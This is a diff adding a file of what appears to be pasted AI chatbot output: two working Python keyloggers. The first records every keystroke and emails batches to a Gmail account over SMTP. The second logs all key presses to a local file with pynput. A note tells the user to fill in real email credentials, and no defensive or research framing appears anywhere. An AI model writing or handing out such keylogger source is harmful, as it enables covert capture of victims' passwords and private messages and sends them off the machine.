@@ -1,0 +1,64 @@
+import keyboard
+import smtplib
+from threading import Timer
+from datetime import datetime
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+# Set your email and password
+EMAIL_ADDRESS = "your_email@gmail.com"
+EMAIL_PASSWORD = "your_email_password"
+
+# Initialize the key log
+key_log = ""
+
+# Function to send the key log via email
+def send_email():
+    msg = MIMEMultipart()
+    msg['From'] = EMAIL_ADDRESS
+    msg['To'] = EMAIL_ADDRESS
+    msg['Subject'] = f"Key Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    msg.attach(MIMEText(key_log, 'plain'))
+
+    with smtplib.SMTP('smtp.gmail.com', 587) as server:
+        server.starttls()
+        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
+
+# Function to record key strokes
+def on_key_release(e):
+    global key_log
+    key_log += e.name
+    if len(key_log) >= 100:
+        send_email()
+        key_log = ""
+
+# Start listening to key strokes
+keyboard.on_release(callback=on_key_release)
+
+# Run the script indefinitely
+while True:
+    pass
+AI-generated code. Review and use carefully. More info on FAQ.
+Note: You need to replace "your_email@gmail.com" and "your_email_password" with your actual email credentials.
+Using the “pynput” library:
+The “pynput” library provides a more concise way to create a keylogger.
+Here’s an example using “pynput”:
+Python
+
+from pynput.keyboard import Key, Listener
+import logging
+
+# Set the log file path
+log_file = "keylog.txt"
+
+# Initialize logging
+logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")
+
+# Function to log key presses
+def on_press(key):
+    logging.info(str(key))
+
+# Start listening to key presses
+with Listener(on_press=on_press) as listener:
+    listener.join()
